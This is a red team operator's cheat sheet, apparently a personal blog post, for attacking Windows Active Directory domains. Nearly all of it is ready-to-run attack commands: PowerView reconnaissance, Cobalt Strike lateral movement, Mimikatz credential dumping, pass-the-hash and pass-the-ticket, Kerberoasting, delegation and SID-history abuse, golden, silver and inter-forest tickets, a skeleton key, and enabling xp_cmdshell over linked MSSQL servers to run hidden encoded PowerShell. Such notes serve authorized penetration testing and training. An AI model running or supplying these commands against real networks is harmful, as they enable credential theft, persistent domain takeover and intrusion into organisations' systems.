---
title: "Red Team Operator NOTES"
date: 2021-11-16
draft: false
---

# Tools used
- PowerView/SharpView
- PowerUp/SharpUp
- Rubeus
- Impacket
- Mimikatz
- Bloodhound
- PowerUpSQL
- Seatbelt


# Domain Recon

## PowerView / SharpView
- Get current domain: `Get-Domain`
- Get domain SID: `Get-DomainSID`


- Enumerating domain computers:
 `Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName`
 
- Get domain groups with "admin":
 `Get-DomainGroup | where Name -like "Admins" | select SamAccountName`

- Enumerate users in domain group:
`Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName`

- Find computers where a user has a session:
`Find-DomainUserLocation | Select-Object UserName, SessionFromName`

- Enumerate users logged on to a machine:
`Get-NetLoggedon -ComputerName <ComputerName>`


- Enumerating file shares:
````
#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
````

- Enumerating ACLs:
````
Get-DomainObjectAcl -Identity <AccountName> -ResolveGUIDs
````

- Enumerating Domain and Forest Trusts:
```
Get-DomainTrust
Get-DomainTrust -Domain <DomainName>

#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
Get-DomainTrustMapping

# Enumerating Forest Trust
Get-ForestTrust
Get-ForestTrust -Forest <ForestName>
```


# Local Privilege Escalation
- PowerUp.ps1
- SharpUp.exe


# Lateral Movement
## Cobalt Strike's jump method
- Powershell Remoting:
`jump winrm <target> <listener>`
`jump winrm64 <target> <listener>`

- PsExec: Copies a service binary to ADMIN$ and executes via SCM.
Cobalt Strike's jump will automatically migrate the process into rundll32.exe to delete service binary from disk.
`jump psexec <target> <listener>`
`jump psexec64 <target> <listener>`


## Mimikatz Commands

````
#Dumping LSASS hashes and passwords
mimikatz sekurlsa::logonpasswords

#Dumps local kerberos encryption keys
mimikatz sekurlsa::ekeys

#Dump SAM
mimikatz lsadump::sam

#Dumping domain cached creds
mimikatz lsadump::cache

#Pass the hash
mimikatz sekurlsa::pth /user:<usertoauth> /domain:<domainname> /ntlm:<ntlmpasswordhash>

#Pass the ticket
mimikatz kerberos::ptt <kirbi ticket>

````

## Overpass the Hash
Overpass the hash allows you to authenticate via kerberos rather than NTLM. We will need: TGT of user we want to impersonate. You can use NTLM hash or AES key to request a TGT.

How to get TGT?
- Request TGT with ntlm hash or ekey
- Dump tgt from machine with mimikatz or rubeus
- unconstrained delegation + printer bug

- Overpass the Hash with Rubeus:
````
# Request TGT
execute-assembly /path/Rubeus.exe asktgt /user:user /domain:domain /rc4:ntlmhashofuserpassword /nowrap

# Request TGT (alternative: pulling tgt from memory)

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap

# Create sacrificial logon session
make_token DOMAIN\user dummypass

# Pass TGT into session
kerberos_ticket_use <kirbi>


````


# Domain Privilege Escalation
## Kerberoasting / ASREProasting
- Using Rubeus:
````
# Kerberoast specific user account
execute-assembly /path/Rubeus.exe kerberoast /user:svc /nowrap

#ASREProast specific user account
execute-assembly /path/Rubeus.exe asreproast /user:svc /nowrap

````

## DPAPI creds
````
#List cred manager blobs in appdata
run vaultcmd /listcreds:"Windows Credentials" /all

#List cred manager blobs with mimikatz
mimikatz vault::list
````

## Unconstrained Delegation
- If we have local admin on a machine with unconstrained delegation enabled, when a higher priv target connects to the machine we can steal their TGT and impersonate them. We can also force this with printer bug.

- Using rubeus and powerview:
````
# Enumerate users in domain with unconstrained delegation
Get-NetComputer -UnConstrained

# Monitoring incoming session to machine and capture TGT
execute-assembly /path/Rubeus.exe monitor /targetuser:<target> /interval:5

# Create sacrificial logon session and pass ticket to session to impersonate
````

## Constrained Delegation
- Using rubeus and powerview:
````
#Check if users and machines has constrained delegation enabled
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Request for TGT of user that has constrained delegation
Use Rubeus asktgt with ntlm hash / ekeys OR dump TGT from memory

# Using the TGT, request TGS for service that the user can delegate to
execute-assembly /path/Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPassword> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" 

# Pass the ticket with rubeus or make_token + kerberos_ticket_use

````

## SID History Abuse
We can use SID History abuse to escalate from child domain to root domain in a forest if we have DA rights in a child domain.

````
#Get SID of current domain
Get-DomainSID -Domain <child.domain>

# Get SID of a target group in root domain (Domain Admin in this case)
Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

# Create golden ticket with SID of target group in root domain to gain access to resources there

kerberos::golden /user:Administrator /domain:<currentdomain> /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<DomainAdminSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

# Pass the ticket and win at life
````


# Domain Persistence 
## Golden Ticket Attack
A golden ticket can be used to impersonate any user, to any service, on any machine in the domain. The krbtgt NTLM/AES is the key to the kingdom.


````
# DCSYNC and grab krbtgt hash or key
dcsync DOMAINNAME DOMAIN\krbtgt



#Create golden ticket

'"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi"'

#PTT AND WIN

````

## Silver Ticket Attack
````
'"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<SPNhash> /user:<UserToImpersonate> /ticket:silver.kirbi"'
````

## Skeleton Key
````
mimikatz !misc::skeleton
````


# Cross Forest Attack
## Trust Ticket
````
#Dump the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"'
````

## MSSQL Abuse
````
#Check mssql instance and test connection
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
````
- "A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!"

````
# PowerUpSQL to check for links
Get-SQLServerLink -Instance <SPN> -Verbose

#Check links across domains/forest
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

# Query remote instance with heidisql or mssqlclient
SELECT * FROM OPENQUERY("sqlinstance", 'select @@servername');

# Enable xp_cmdshell if rpc out is enabled on remote instance
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance] EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]

# Execute shell
SELECT * FROM OPENQUERY("sqlinstance", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')